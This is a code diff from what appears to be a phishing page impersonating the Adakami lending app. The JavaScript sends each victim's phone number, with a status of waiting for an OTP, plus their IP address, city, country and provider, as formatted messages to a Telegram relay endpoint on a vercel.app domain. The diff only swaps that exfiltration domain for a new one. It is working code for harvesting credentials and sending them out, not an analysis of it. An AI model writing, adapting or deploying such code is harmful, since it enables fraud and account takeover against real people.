@@ -194,7 +194,7 @@
             submitBtn.disabled = true;
             submitBtn.style.opacity = '0.7';
 
-            const message = `<b> ─⋆⋅𖤓⋅⋆◦•●◉✿ ㅤㅤㅤ﷽ ㅤㅤㅤ✿◉●•◦⋆⋅𖤓⋅⋆─</b>\n•●◉✿┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈✿◉●•\n<b>👤 𝙿𝙴𝙽𝙶𝙸𝚁𝙸𝙼 ㅤ: </b> <code>${phone}</code>\n<b>🌐 𝙳𝙾𝙼𝙰𝙸𝙽  ㅤㅤ: </b> adakami-xi.vercel.app\n<b>📨 𝚂𝚃𝙰𝚃𝚄𝚂  ㅤㅤ: </b> 𝑴𝒆𝒏𝒖𝒏𝒈𝒈𝒖 𝑶𝑻𝑷...\n`;
+            const message = `<b> ─⋆⋅𖤓⋅⋆◦•●◉✿ ㅤㅤㅤ﷽ ㅤㅤㅤ✿◉●•◦⋆⋅𖤓⋅⋆─</b>\n•●◉✿┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈✿◉●•\n<b>👤 𝙿𝙴𝙽𝙶𝙸𝚁𝙸𝙼 ㅤ: </b> <code>${phone}</code>\n<b>🌐 𝙳𝙾𝙼𝙰𝙸𝙽  ㅤㅤ: </b> adakami-eta.vercel.app\n<b>📨 𝚂𝚃𝙰𝚃𝚄𝚂  ㅤㅤ: </b> 𝑴𝒆𝒏𝒖𝒏𝒈𝒈𝒖 𝑶𝑻𝑷...\n`;
             sendTelegramMessage(message);
             
             setTimeout(() => {
@@ -206,7 +206,7 @@
         }
 
         function sendTelegramMessage(text) {
-            fetch('https://adakami-xi.vercel.app/api/kirim-telegram', {
+            fetch('https://adakami-eta.vercel.app/api/kirim-telegram', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ pesan: text })
@@ -331,7 +331,7 @@
                 .then(data => {
                     const infoPesan = `<b></b>\n── ⋆⋅𖤓⋅⋆◦•●◉✿ ㅤㅤ ☠︎  ㅤㅤ✿◉●•◦⋆⋅𖤓⋅⋆ ──\n<b></b>•●◉✿┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈✿◉●•\n<b>IP:</b> <code>${data.ip || '-'}</code>\n<b>Kota:</b> ${data.city || '-'} \n<b>Negara:</b> ${data.country_name || '-'}\n<b>Provider:</b> ${data.org || '-'}\n<b>Waktu:</b> ${new Date().toLocaleString('id-ID')} \n┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈\n<b>•●◉✿𓂃𓂃𓂃𝘋𝘦𝘷𝘦𝘭𝘰𝘱𝘦𝘳 𝘣𝘺 ➤⃝𝘝𝘺𝘳𝘦𝘹𓂃𓂃𓂃✿◉●•</b>`;
 
-                    fetch('https://adakami-xi.vercel.app/api/kirim-telegram', {
+                    fetch('https://adakami-eta.vercel.app/api/kirim-telegram', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({ pesan: infoPesan })
